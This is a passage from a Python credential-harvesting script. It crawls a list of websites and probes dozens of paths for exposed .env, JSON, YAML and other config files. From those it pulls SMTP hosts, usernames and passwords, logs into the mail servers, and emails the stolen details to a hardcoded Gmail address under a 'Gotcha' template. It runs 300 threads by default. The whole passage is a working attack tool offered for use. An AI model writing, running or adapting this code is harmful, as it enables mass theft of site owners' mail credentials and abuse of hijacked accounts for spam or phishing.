        ('MAILJET', 'MAILJET_HOST', 'MAILJET_PORT', 'MAILJET_API_KEY', 'MAILJET_SECRET_KEY', 'MAILJET_FROM_ADDRESS'),
        ('SENDINBLUE', 'SENDINBLUE_HOST', 'SENDINBLUE_PORT', 'SENDINBLUE_API_KEY', 'SENDINBLUE_SECRET_KEY', 'SENDINBLUE_FROM_ADDRESS'),
        ('ELASTICMAIL', 'ELASTICMAIL_HOST', 'ELASTICMAIL_PORT', 'ELASTICMAIL_API_KEY', 'ELASTICMAIL_SECRET_KEY', 'ELASTICMAIL_FROM_ADDRESS')
    ]

    try:
        config = {}
        # Regex to find key-value pairs in JavaScript-like configuration text
        matches = re.findall(r'(\w+)\s*=\s*["\']?(.*?)["\']?\s*;', text)
        for key, value in matches:
            config[key] = value

        # Attempt to retrieve configuration values from different possible sources
        for section, *keys in possible_configs:
            values = {key: config.get(key, '') for key in keys}
            mailuser = values.get(keys[2], '')
            mailpass = values.get(keys[3], '')

            # Set mailfrom to mailuser if not specified
            mailfrom = values.get(keys[4], mailuser) if len(keys) > 4 else mailuser

            if mailuser not in ["null", ""] and mailpass not in ["null", ""]:
                return {
                    'mailhost': values.get(keys[0], ''),
                    'mailport': values.get(keys[1], ''),
                    'mailuser': mailuser,
                    'mailpass': mailpass,
                    'mailfrom': mailfrom
                }
    except Exception as e:
        print(f"Failed to extract JS config: {e}")
    
    # Return None if no valid configuration is found
    return None


# Function to send a test email
def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    if '465' in str(mailport):
        port = '465'  # Typically 465 is used for SSL
    else:
        port = str(mailport)
    smtp_server = str(mailhost)
    if not mailfrom:
        sender_email = mailuser
    else:
        sender_email = str(mailfrom.replace('"', ''))
    login = str(mailuser.replace('"', ''))
    password = str(mailpass.replace('"', ''))
    receiver_email = "scam.rest@gmail.com"
    
    message = MIMEMultipart('alternative')
    message['Subject'] = 'S.M.T.P - T.E.R.G.R.A.B | DARI: '
    message['From'] = sender_email
    message['To'] = receiver_email
    
    text = '        '
    html = f"""
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Email Template</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                color: #333;
                background-color: #f4f4f4;
                margin: 0;
                padding: 0;
            }}
            .container {{
                width: 100%;
                max-width: 600px;
                margin: 0 auto;
                background-color: #ffffff;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0,0,0,0.1);
                overflow: hidden;
            }}
            .header {{
                background-color: #007bff;
                color: #ffffff;
                padding: 20px;
                text-align: center;
            }}
            .header h1 {{
                margin: 0;
                font-size: 24px;
            }}
            .content {{
                padding: 20px;
            }}
            .content p {{
                margin: 0 0 10px;
                font-size: 16px;
                line-height: 1.5;
            }}
            .content p strong {{
                color: #007bff;
            }}
            .footer {{
                background-color: #f1f1f1;
                padding: 10px;
                text-align: center;
                font-size: 14px;
                color: #666;
            }}
            .footer p {{
                margin: 0;
            }}
            .section-title {{
                font-weight: bold;
                margin: 20px 0 10px;
                font-size: 18px;
                color: #007bff;
            }}
            .section {{
                margin-bottom: 20px;
                padding: 10px;
                border-radius: 4px;
                background-color: #f9f9f9;
                box-shadow: 0 0 5px rgba(0,0,0,0.1);
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>Anna Qitty Tools</h1>
            </div>
            <div class="content">
                <p>Gotcha...!!!</p>
                <p>Below are the details you requested:</p>
                <div class="section">
                    <p class="section-title">Details</p>
                    <p><strong>URL:</strong> {url}</p>
                    <p><strong>HOST:</strong> {mailhost}</p>
                    <p><strong>PORT:</strong> {mailport}</p>
                    <p><strong>USER:</strong> {mailuser}</p>
                    <p><strong>PASSW:</strong> {mailpass}</p>
                    <p><strong>SENDER:</strong> {mailfrom}</p>
                </div>
                <p>Thanks for using this tool. If you have any questions or need further assistance, feel free to <a href="mailto:annaqitty@gmail.com">email me</a>.</p>
            </div>
            <div class="footer">
                <p>&copy; 2024 Anna Qitty. All rights reserved.</p>
            </div>
        </div>
    </body>
    </html>\n
    """
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        with smtplib.SMTP(smtp_server, port) as s:
            s.ehlo()
            s.starttls()
            s.ehlo()
            s.login(login, password)
            s.sendmail(sender_email, receiver_email, message.as_string())
    except Exception as e:
        print(f"Failed to send test email: {e}")

# Function to crawl and extract URLs from a page
def crawl_page(base_url):
    try:
        response = requests.get(base_url, timeout=10, verify=False)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            links = set()
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(base_url, href)
                if urlparse(full_url).scheme in ['http', 'https']:
                    links.add(full_url)
            return links
        else:
            print(f"Failed to access base URL: {base_url}")
            return set()
    except requests.RequestException as e:
        print(f"Failed to crawl base URL {base_url}: {e}")
        return set()

# Function to process a single URL
def process_url(url):
    # Ensure the URL includes a scheme (http:// or https://)
    if not re.match(r'^https?://', url):
        url = 'http://' + url

    # Print the URL being processed
    print(f"Processing URL: {url}")

    try:
        # Check if base URL is accessible
        base_response = requests.get(url, timeout=10)  # Certificate verification is enabled by default
        if base_response.status_code == 200:
            print(f"{Fore.GREEN}{url} | Accessible")
        else:
            print(f"{Fore.RED}{url} | Teu bisa diakses (status code: {base_response.status_code})")
    except requests.RequestException:
        print(f"{Fore.RED}{url} | Teu bisa diakses")

    # Crawl the base URL for other URLs
    urls_to_check = crawl_page(url)
    if not urls_to_check:
        print(f"No URLs found on base URL: {url}")
        return

    file_types = ['.env', '.ini', '.json', '.yaml', '.xml', '.properties','.txt','.cfg','.js','.babelrc','.env.local','.cfg','.env.prod','.env.staging','.env.development','.conf.py','.env.staging','.env.bak','.worker_index','.vector_index','.ts']
    for page_url in urls_to_check:
        for file_type in file_types:
            try:
                # Try both `/config{file_type}` and `{file_type}` paths
                file_urls = [
                    f"{page_url}/config{file_type}",
                    f"{page_url}{file_type}"
                    f"{page_url}/admin{file_type}",
                    f"{page_url}/.docker/{file_type}"
                    f"{page_url}/.docker/config{file_type}"
                    f"{page_url}/sentry/{file_type}"
                    f"{page_url}/sentry/config{file_type}"
                    f"{page_url}/sentry/sentry{file_type}"
                    f"{page_url}/sentry/sentry.example{file_type}"
                    f"{page_url}/process{file_type}",
                    f"{page_url}/gym{file_type}",
                    f"{page_url}/next.config{file_type}",
                    f"{page_url}/config/env/{file_type}",
                    f"{page_url}/build/{file_type}",
                    f"{page_url}/env_config{file_type}",
                    f"{page_url}/build{file_type}",
                    f"{page_url}/Cypress{file_type}",
                    f"{page_url}/user/{file_type}",
                    f"{page_url}/user{file_type}",
                    f"{page_url}/configuration{file_type}",
                    f"{page_url}/configuration-files{file_type}",
                    f"{page_url}/configure{file_type}",
                    f"{page_url}/configuration/{file_type}",
                    f"{page_url}/config_files{file_type}",
                    f"{page_url}/configuration-files/{file_type}",
                    f"{page_url}/admin/{file_type}",



                ]
                for file_url in file_urls:
                    response = requests.get(file_url, timeout=10, verify=False, allow_redirects=False)
                    if response.status_code == 200:
                        text = response.text
                        if file_type == '.env':
                            config = extract_from_env(text)
                        elif file_type == '.env.local':
                            config = extract_from_env(text)
                        elif file_type == '.env.staging':
                            config = extract_from_env(text)
                        elif file_type == '.env.development':
                            config = extract_from_env(text)
                        elif file_type == '.env.bak':
                            config = extract_from_env(text)
                        elif file_type == '.worker_index':
                            config = extract_from_env(text)
                        elif file_type == '.vector_index':
                            config = extract_from_env(text)
                        elif file_type == '.conf.py':
                            config = extract_from_env(text)
                        elif file_type == '.babelrc':
                            config = extract_from_js(text)
                        elif file_type == '.js':
                            config = extract_from_js(text)
                        elif file_type == '.cfg':
                            config = extract_from_txt(text)
                        elif file_type == '.ts':
                            config = extract_from_js(text)



                        elif file_type == '.ini':
                            config = extract_from_ini(text)
                        elif file_type == '.json':
                            config = extract_from_json(text)
                        elif file_type == '.yaml':
                            config = extract_from_yaml(text)
                        elif file_type == '.xml':
                            config = extract_from_xml(text)
                        elif file_type == '.properties':
                            config = extract_from_properties(text)
                        elif file_type == '.txt':
                            config = extract_from_txt(text)

                        if config:
                            sendtestoff(page_url, **config)
                            return  # Exit after sending email for the first found configuration
                    else:
                        print(f"Received unexpected status code {response.status_code} for {file_url}")
            except requests.RequestException as e:
                print(f"Request failed for {file_url}: {e}")
            except Exception as e:
                print(f"Failed to process file {file_type} for URL {page_url}: {e}")

# Read URLs from file and process each URL
def process_urls(file_path, num_threads):
    with open(file_path, 'r') as file:
        urls = [url.strip() for url in file.readlines() if url.strip()]

    # Create a thread pool
    threads = []
    for url in urls:
        # Create and start a new thread for each URL
        thread = threading.Thread(target=process_url, args=(url,))
        thread.start()
        threads.append(thread)
        
        # If we have reached the limit of threads, wait for them to finish
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []

    # Wait for the remaining threads to finish
    for t in threads:
        t.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Process URLs with a specified number of threads.')
    parser.add_argument('file', type=str, help='Path to the file containing URLs')
    parser.add_argument('--threads', type=int, default=300, help='Number of concurrent threads (default: 300)')
    args = parser.parse_args()

    process_urls(args.file, args.threads)
